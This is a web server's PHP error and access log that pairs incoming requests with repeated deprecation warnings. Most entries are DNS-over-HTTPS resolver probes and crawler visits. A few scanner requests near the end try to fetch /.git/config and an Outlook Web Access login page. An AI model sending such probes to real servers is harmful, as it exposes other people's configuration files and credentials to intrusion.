[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:38+08:00 ] 8.208.10.94 GET 120.24.147.77/dns-query?dns=ib8BAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:38+08:00 ] 8.208.10.94 GET 120.24.147.77/dns-query?dns=ib8BAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:38+08:00 ] 8.208.10.94 POST 120.24.147.77/dns-query
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:38+08:00 ] 8.208.10.94 GET 120.24.147.77/dns-query
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:39+08:00 ] 8.208.10.94 GET 120.24.147.77/dns-query?name=1.odns.m.dnsmeasure.top&type=A
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:39+08:00 ] 8.208.10.94 GET 120.24.147.77/dns-query?name=1.odns.m.dnsmeasure.top&type=A
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:39+08:00 ] 8.208.10.94 GET 120.24.147.77/query?dns=KwwBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:39+08:00 ] 8.208.10.94 GET 120.24.147.77/query?dns=KwwBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:39+08:00 ] 8.208.10.94 POST 120.24.147.77/query
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:39+08:00 ] 8.208.10.94 GET 120.24.147.77/query
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:40+08:00 ] 8.208.10.94 GET 120.24.147.77/query?name=1.odns.m.dnsmeasure.top&type=A
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:40+08:00 ] 8.208.10.94 GET 120.24.147.77/query?name=1.odns.m.dnsmeasure.top&type=A
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:41+08:00 ] 8.208.10.94 GET 120.24.147.77/query?dns=2vQBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:41+08:00 ] 8.208.10.94 GET 120.24.147.77/query?dns=2vQBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:41+08:00 ] 8.208.10.94 POST 120.24.147.77/query
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:41+08:00 ] 8.208.10.94 GET 120.24.147.77/query
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:42+08:00 ] 8.208.10.94 GET 120.24.147.77/query?name=1.odns.m.dnsmeasure.top&type=A
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:42+08:00 ] 8.208.10.94 GET 120.24.147.77/query?name=1.odns.m.dnsmeasure.top&type=A
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:42+08:00 ] 8.208.10.94 GET 120.24.147.77/resolve?dns=jmEBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:42+08:00 ] 8.208.10.94 GET 120.24.147.77/resolve?dns=jmEBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:43+08:00 ] 8.208.10.94 POST 120.24.147.77/resolve
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:43+08:00 ] 8.208.10.94 GET 120.24.147.77/resolve
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:43+08:00 ] 8.208.10.94 GET 120.24.147.77/resolve?name=1.odns.m.dnsmeasure.top&type=A
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:43+08:00 ] 8.208.10.94 GET 120.24.147.77/resolve?name=1.odns.m.dnsmeasure.top&type=A
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:43+08:00 ] 8.208.10.94 GET 120.24.147.77/resolve?dns=J1QBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:43+08:00 ] 8.208.10.94 GET 120.24.147.77/resolve?dns=J1QBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:44+08:00 ] 8.208.10.94 POST 120.24.147.77/resolve
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:44+08:00 ] 8.208.10.94 GET 120.24.147.77/resolve
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:44+08:00 ] 8.208.10.94 GET 120.24.147.77/resolve?name=1.odns.m.dnsmeasure.top&type=A
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:44+08:00 ] 8.208.10.94 GET 120.24.147.77/resolve?name=1.odns.m.dnsmeasure.top&type=A
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:45+08:00 ] 8.208.10.94 GET 120.24.147.77/?dns=xRgBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T08:18:47+08:00 ] 40.77.167.14 GET www.punalei.cn/ldcms/wenduceshichanpin.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:18:47+08:00 ] 8.208.10.94 POST 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T08:18:49+08:00 ] 8.208.10.94 GET 120.24.147.77/?name=1.odns.m.dnsmeasure.top&type=A
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T08:18:51+08:00 ] 8.208.10.94 GET 120.24.147.77/?dns=RO4BAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T08:18:53+08:00 ] 8.208.10.94 POST 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T08:18:56+08:00 ] 8.208.10.94 GET 120.24.147.77/?name=1.odns.m.dnsmeasure.top&type=A
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T08:40:09+08:00 ] 52.167.144.182 GET www.punalei.cn/ldcms/lianxiwomen.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:41:37+08:00 ] 20.221.71.226 GET 120.24.147.77/owa/auth/logon.aspx
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:41:37+08:00 ] 20.221.71.226 GET 120.24.147.77/owa/auth/logon.aspx
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:42:52+08:00 ] 172.94.9.253 GET 120.24.147.77/.git/config
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T08:47:26+08:00 ] 66.132.153.143 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
